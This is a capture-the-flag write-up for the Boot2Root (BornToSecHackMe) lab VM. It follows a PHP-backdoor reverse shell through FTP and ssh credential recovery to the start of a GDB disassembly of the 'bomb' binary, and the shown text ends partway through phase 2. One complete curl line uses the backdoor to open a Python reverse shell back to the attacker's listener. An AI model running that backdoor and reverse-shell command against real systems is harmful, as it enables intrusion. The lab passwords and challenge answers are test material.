# Boot2Root - Writeup 2

Let's start again from the part **Reverse shell** in the first writeup

Remember, we had a reverse shell with the php backdoor on the forum.

Start it with netcat (explanations on the first writeup)

**Client** (our machine):

```sh
$> ncat -nvklp 1234
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::1234
Ncat: Listening on 0.0.0.0:1234
```

**Server**:

```sh
curl --insecure 'https://192.168.1.22/forum/templates_c/backdoor.php?cmd=python%20-c%20%27import%20socket%2Csubprocess%2Cos%2Cpty%3Bs%3Dsocket.socket%28socket.AF_INET%2Csocket.SOCK_STREAM%29%3Bs.connect%28%28%22192.168.1.47%22%2C1234%29%29%3Bos.dup2%28s.fileno%28%29%2C0%29%3B%20os.dup2%28s.fileno%28%29%2C1%29%3B%20os.dup2%28s.fileno%28%29%2C2%29%3Bp%3Dpty.spawn%28%22%2Fbin%2Fbash%22%29%3B%27'
```

We can search some other informations on the server to find an other way to be root...

```sh
$ cd /
$ ls
bin    dev   initrd.img  mnt   rofs  sbin     sys  var
boot   etc   lib	 opt   root  selinux  tmp  vmlinuz
cdrom  home  media	 proc  run   srv      usr
```
```sh
$ cd home
$ ls
LOOKATME  ft_root  laurie  laurie@borntosec.net  lmezard  thor	zaz
```
```sh
$ cd LOOKATME
$ ls
password
$ cat password
lmezard:G!@M6f4Eatau{sF"
```
Found a login/password again.
`lmezard`
`G!@M6f4Eatau{sF"`

Try it on ssh... Nope.

Remember all the open services

```
$ nmap 192.168.1.22                                                                    !
Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-04 16:50 CEST
Nmap scan report for borntosechackme.home (192.168.1.22)
Host is up (0.00025s latency).
Not shown: 994 closed ports
PORT    STATE SERVICE
21/tcp  open  ftp
22/tcp  open  ssh
80/tcp  open  http
143/tcp open  imap
443/tcp open  https
993/tcp open  imaps
```
We can try ftp

## FTP

```
$ ftp 192.168.1.22
Connected to 192.168.1.22.
220 Welcome on this server
Name (192.168.1.22:nico): lmezard
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp>
```
Good!

```
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rwxr-x---    1 1001     1001           96 Oct 15  2015 README
-rwxr-x---    1 1001     1001       808960 Oct 08  2015 fun
226 Directory send OK.
```

There is 2 files in the ftp of lmezard. Download it to read it

ftp> get README
local: README remote: README
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for README (96 bytes).
226 Transfer complete.
96 bytes received in 0.00 secs (721.1539 kB/s)
ftp> get fun
local: fun remote: fun
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for fun (808960 bytes).
226 Transfer complete.
808960 bytes received in 0.02 secs (42.6730 MB/s)
ftp> 221 Goodbye.

```
$ cat README 
Complete this little challenge and use the result as password for user 'laurie' to login in ssh
```

The file `fun` is a tar archive

```
$ tar xvf fun
```

Now we have a `ft_fun` directory with a lot of pcap files. Wireshark can't open, so it's not a reals pcap files. All the files follow the same pattern

```
$ cat 00M73.pcap 
void useless() {

//file12%   
```

A line of C code and a comment with the file number.

Create a python script to add all the code, sorted by the file number in comment, in a `main.c` file

```sh
$ ./scripts/pcap_files_to_c.py
$ gcc main.c
$ ./a.out
MY PASSWORD IS: Iheartpwnage
Now SHA-256 it and submit%
```

We have the password. Need to SHA-256 it and connect to ssh

```sh
$ echo -n 'Iheartpwnage' | sha256sum
330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4  -
```

## Laurie

Connect to ssh with the user `laurie` and the password `330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4`

```sh
$ ssh laurie@192.168.1.22           
        ____                _______    _____           
       |  _ \              |__   __|  / ____|          
       | |_) | ___  _ __ _ __ | | ___| (___   ___  ___ 
       |  _ < / _ \| '__| '_ \| |/ _ \\___ \ / _ \/ __|
       | |_) | (_) | |  | | | | | (_) |___) |  __/ (__ 
       |____/ \___/|_|  |_| |_|_|\___/_____/ \___|\___|

                       Good luck & Have fun
laurie@192.168.1.22's password: 
laurie@BornToSecHackMe:~$
```

Now we have a ssh connection as the `laurie` user

```
$ ls
README  bomb
$ cat README
Diffuse this bomb!
When you have all the password use it as "thor" user with ssh.

HINT:
P
 2
 b

o
4

NO SPACE IN THE PASSWORD (password is case sensitive).
$ file bomb
bomb: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.0.0, not stripped

```

There is a README for explain the challenge and one binary

```
$ ./bomb 
Welcome this is my little bomb !!!! You have 6 stages with
only one life good luck !! Have a nice day!


test

BOOM!!!
The bomb has blown up.
```

The binary wait an input. Check it in GDB

```
(gdb) disas main
Dump of assembler code for function main:
   0x080489b0 <+0>:	push   ebp
   0x080489b1 <+1>:	mov    ebp,esp
   0x080489b3 <+3>:	sub    esp,0x14
   0x080489b6 <+6>:	push   ebx
   0x080489b7 <+7>:	mov    eax,DWORD PTR [ebp+0x8]
   0x080489ba <+10>:	mov    ebx,DWORD PTR [ebp+0xc]
   0x080489bd <+13>:	cmp    eax,0x1
   0x080489c0 <+16>:	jne    0x80489d0 <main+32>
   0x080489c2 <+18>:	mov    eax,ds:0x804b648
   0x080489c7 <+23>:	mov    ds:0x804b664,eax
   0x080489cc <+28>:	jmp    0x8048a30 <main+128>
   0x080489ce <+30>:	mov    esi,esi
   0x080489d0 <+32>:	cmp    eax,0x2
   0x080489d3 <+35>:	jne    0x8048a10 <main+96>
   0x080489d5 <+37>:	add    esp,0xfffffff8
   0x080489d8 <+40>:	push   0x8049620
   0x080489dd <+45>:	mov    eax,DWORD PTR [ebx+0x4]
   0x080489e0 <+48>:	push   eax
   0x080489e1 <+49>:	call   0x8048880 <fopen@plt>
   0x080489e6 <+54>:	mov    ds:0x804b664,eax
   0x080489eb <+59>:	add    esp,0x10
   0x080489ee <+62>:	test   eax,eax
   0x080489f0 <+64>:	jne    0x8048a30 <main+128>
   0x080489f2 <+66>:	add    esp,0xfffffffc
   0x080489f5 <+69>:	mov    eax,DWORD PTR [ebx+0x4]
   0x080489f8 <+72>:	push   eax
   0x080489f9 <+73>:	mov    eax,DWORD PTR [ebx]
   0x080489fb <+75>:	push   eax
   0x080489fc <+76>:	push   0x8049622
   0x08048a01 <+81>:	call   0x8048810 <printf@plt>
   0x08048a06 <+86>:	add    esp,0xfffffff4
   0x08048a09 <+89>:	push   0x8
   0x08048a0b <+91>:	call   0x8048850 <exit@plt>
   0x08048a10 <+96>:	add    esp,0xfffffff8
   0x08048a13 <+99>:	mov    eax,DWORD PTR [ebx]
   0x08048a15 <+101>:	push   eax
   0x08048a16 <+102>:	push   0x804963f
   0x08048a1b <+107>:	call   0x8048810 <printf@plt>
   0x08048a20 <+112>:	add    esp,0xfffffff4
   0x08048a23 <+115>:	push   0x8
---Type <return> to continue, or q <return> to quit---
   0x08048a25 <+117>:	call   0x8048850 <exit@plt>
   0x08048a2a <+122>:	lea    esi,[esi+0x0]
   0x08048a30 <+128>:	call   0x8049160 <initialize_bomb>
   0x08048a35 <+133>:	add    esp,0xfffffff4
   0x08048a38 <+136>:	push   0x8049660
   0x08048a3d <+141>:	call   0x8048810 <printf@plt>
   0x08048a42 <+146>:	add    esp,0xfffffff4
   0x08048a45 <+149>:	push   0x80496a0
   0x08048a4a <+154>:	call   0x8048810 <printf@plt>
   0x08048a4f <+159>:	add    esp,0x20
   0x08048a52 <+162>:	call   0x80491fc <read_line>
   0x08048a57 <+167>:	add    esp,0xfffffff4
   0x08048a5a <+170>:	push   eax
   0x08048a5b <+171>:	call   0x8048b20 <phase_1>
   0x08048a60 <+176>:	call   0x804952c <phase_defused>
   0x08048a65 <+181>:	add    esp,0xfffffff4
   0x08048a68 <+184>:	push   0x80496e0
   0x08048a6d <+189>:	call   0x8048810 <printf@plt>
   0x08048a72 <+194>:	add    esp,0x20
   0x08048a75 <+197>:	call   0x80491fc <read_line>
   0x08048a7a <+202>:	add    esp,0xfffffff4
   0x08048a7d <+205>:	push   eax
   0x08048a7e <+206>:	call   0x8048b48 <phase_2>
   0x08048a83 <+211>:	call   0x804952c <phase_defused>
   0x08048a88 <+216>:	add    esp,0xfffffff4
   0x08048a8b <+219>:	push   0x8049720
   0x08048a90 <+224>:	call   0x8048810 <printf@plt>
   0x08048a95 <+229>:	add    esp,0x20
   0x08048a98 <+232>:	call   0x80491fc <read_line>
   0x08048a9d <+237>:	add    esp,0xfffffff4
   0x08048aa0 <+240>:	push   eax
   0x08048aa1 <+241>:	call   0x8048b98 <phase_3>
   0x08048aa6 <+246>:	call   0x804952c <phase_defused>
   0x08048aab <+251>:	add    esp,0xfffffff4
   0x08048aae <+254>:	push   0x804973f
   0x08048ab3 <+259>:	call   0x8048810 <printf@plt>
   0x08048ab8 <+264>:	add    esp,0x20
   0x08048abb <+267>:	call   0x80491fc <read_line>
   0x08048ac0 <+272>:	add    esp,0xfffffff4
   0x08048ac3 <+275>:	push   eax
   0x08048ac4 <+276>:	call   0x8048ce0 <phase_4>
---Type <return> to continue, or q <return> to quit---
   0x08048ac9 <+281>:	call   0x804952c <phase_defused>
   0x08048ace <+286>:	add    esp,0xfffffff4
   0x08048ad1 <+289>:	push   0x8049760
   0x08048ad6 <+294>:	call   0x8048810 <printf@plt>
   0x08048adb <+299>:	add    esp,0x20
   0x08048ade <+302>:	call   0x80491fc <read_line>
   0x08048ae3 <+307>:	add    esp,0xfffffff4
   0x08048ae6 <+310>:	push   eax
   0x08048ae7 <+311>:	call   0x8048d2c <phase_5>
   0x08048aec <+316>:	call   0x804952c <phase_defused>
   0x08048af1 <+321>:	add    esp,0xfffffff4
   0x08048af4 <+324>:	push   0x80497a0
   0x08048af9 <+329>:	call   0x8048810 <printf@plt>
   0x08048afe <+334>:	add    esp,0x20
   0x08048b01 <+337>:	call   0x80491fc <read_line>
   0x08048b06 <+342>:	add    esp,0xfffffff4
   0x08048b09 <+345>:	push   eax
   0x08048b0a <+346>:	call   0x8048d98 <phase_6>
   0x08048b0f <+351>:	call   0x804952c <phase_defused>
   0x08048b14 <+356>:	xor    eax,eax
   0x08048b16 <+358>:	mov    ebx,DWORD PTR [ebp-0x18]
   0x08048b19 <+361>:	mov    esp,ebp
   0x08048b1b <+363>:	pop    ebp
   0x08048b1c <+364>:	ret    
End of assembler dump.
```

We can resume the behavior of the program to:

- readline
- phase_X (check the line)
- if line good next phase (total 6) else BOMB

We can check the phases functions

### Phase 1

```
(gdb) disas phase_1
Dump of assembler code for function phase_1:
   0x08048b20 <+0>:	    push   ebp
   0x08048b21 <+1>:	    mov    ebp,esp
   0x08048b23 <+3>:	    sub    esp,0x8
   0x08048b26 <+6>:	    mov    eax,DWORD PTR [ebp+0x8]
   0x08048b29 <+9>:	    add    esp,0xfffffff8
   0x08048b2c <+12>:	push   0x80497c0
   0x08048b31 <+17>:	push   eax
   0x08048b32 <+18>:	call   0x8049030 <strings_not_equal>
   0x08048b37 <+23>:	add    esp,0x10
   0x08048b3a <+26>:	test   eax,eax
   0x08048b3c <+28>:	je     0x8048b43 <phase_1+35>
   0x08048b3e <+30>:	call   0x80494fc <explode_bomb>
   0x08048b43 <+35>:	mov    esp,ebp
   0x08048b45 <+37>:	pop    ebp
   0x08048b46 <+38>:	ret    
End of assembler dump.
(gdb) x/s 0x80497c0
0x80497c0:	 "Public speaking is very easy."

```

This is a comp with the input line and a string in the program. Compared with the function `strings_not_equal`.

The needed string is **"Public speaking is very easy."**

### Phase 2

```
(gdb) disas phase_2
Dump of assembler code for function phase_2:
   0x08048b48 <+0>:	    push   ebp
   0x08048b49 <+1>:	    mov    ebp,esp
   0x08048b4b <+3>:	    sub    esp,0x20
   0x08048b4e <+6>:	    push   esi
   0x08048b4f <+7>:	    push   ebx
   0x08048b50 <+8>:	    mov    edx,DWORD PTR [ebp+0x8]
   0x08048b53 <+11>:	add    esp,0xfffffff8
   0x08048b56 <+14>:	lea    eax,[ebp-0x18]
   0x08048b59 <+17>:	push   eax
   0x08048b5a <+18>:	push   edx
   0x08048b5b <+19>:	call   0x8048fd8 <read_six_numbers>
   0x08048b60 <+24>:	add    esp,0x10
   0x08048b63 <+27>:	cmp    DWORD PTR [ebp-0x18],0x1
   0x08048b67 <+31>:	je     0x8048b6e <phase_2+38>
   0x08048b69 <+33>:	call   0x80494fc <explode_bomb>
   0x08048b6e <+38>:	mov    ebx,0x1
   0x08048b73 <+43>:	lea    esi,[ebp-0x18]
   0x08048b76 <+46>:	lea    eax,[ebx+0x1]
   0x08048b79 <+49>:	imul   eax,DWORD PTR [esi+ebx*4-0x4]
   0x08048b7e <+54>:	cmp    DWORD PTR [esi+ebx*4],eax
   0x08048b81 <+57>:	je     0x8048b88 <phase_2+64>
   0x08048b83 <+59>:	call   0x80494fc <explode_bomb>
   0x08048b88 <+64>:	inc    ebx
   0x08048b89 <+65>:	cmp    ebx,0x5
   0x08048b8c <+68>:	jle    0x8048b76 <phase_2+46>
   0x08048b8e <+70>:	lea    esp,[ebp-0x28]
   0x08048b91 <+73>:	pop    ebx
   0x08048b92 <+74>:	pop    esi
   0x08048b93 <+75>:	mov    esp,ebp
   0x08048b95 <+77>:	pop    ebp
   0x08048b96 <+78>:	ret    
End of assembler dump.
```


